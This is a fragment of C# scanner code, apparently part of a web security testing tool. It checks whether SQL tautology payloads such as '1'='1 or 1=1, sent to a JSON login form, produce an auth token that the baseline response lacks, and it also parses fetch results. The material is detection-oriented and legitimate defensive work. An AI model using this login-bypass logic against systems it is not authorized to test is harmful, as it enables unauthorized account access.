        if (string.IsNullOrWhiteSpace(bodyTemplate) || !bodyTemplate.TrimStart().StartsWith('{')) return false;
        if (!TautologyPayloadLooksSqlLike(payload)) return false;
        try
        {
            using var doc = JsonDocument.Parse(bodyTemplate);
            if (!JsonBodySuggestsLoginForm(doc.RootElement)) return false;
        }
        catch
        {
            return false;
        }

        if (!JsonResponseLooksLikeJsonAuthToken(responseBody) || JsonResponseLooksLikeJsonAuthToken(baselineBody))
            return false;
        return true;
    }

    private static bool TautologyPayloadLooksSqlLike(string payload) =>
        payload.Contains('\'', StringComparison.Ordinal) &&
        (payload.Contains("'1'='1", StringComparison.Ordinal) || payload.Contains("1=1", StringComparison.Ordinal));

    private static bool JsonResponseLooksLikeJsonAuthToken(string body)
    {
        if (string.IsNullOrWhiteSpace(body)) return false;
        var t = body.TrimStart();
        if (t.Length == 0 || (t[0] != '{' && t[0] != '[')) return false;
        return body.Contains("\"token\":", StringComparison.Ordinal)
            || body.Contains("\"accessToken\":", StringComparison.Ordinal)
            || body.Contains("\"access_token\":", StringComparison.Ordinal);
    }

    internal readonly record struct FetchParseResult(int Status, string Body, bool Ok, string? Location);

    internal static FetchParseResult ParseFetchJsonFull(string json)
    {
        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;
            var status = root.GetProperty("status").GetInt32();
            var body = root.TryGetProperty("body", out var b)
                ? b.ValueKind == JsonValueKind.String ? b.GetString() ?? "" : b.GetRawText()
                : "";
            var ok = root.TryGetProperty("ok", out var o) && o.ValueKind == JsonValueKind.True;
            string? location = null;
            if (root.TryGetProperty("location", out var loc) && loc.ValueKind == JsonValueKind.String)
                location = loc.GetString();
            return new FetchParseResult(status, body, ok, location);
        }
        catch
        {
            return new FetchParseResult(0, "", false, null);
        }
    }

    internal static (int status, string body, bool ok) ParseFetchJson(string json)
    {
        var r = ParseFetchJsonFull(json);
        return (r.Status, r.Body, r.Ok);
    }
}
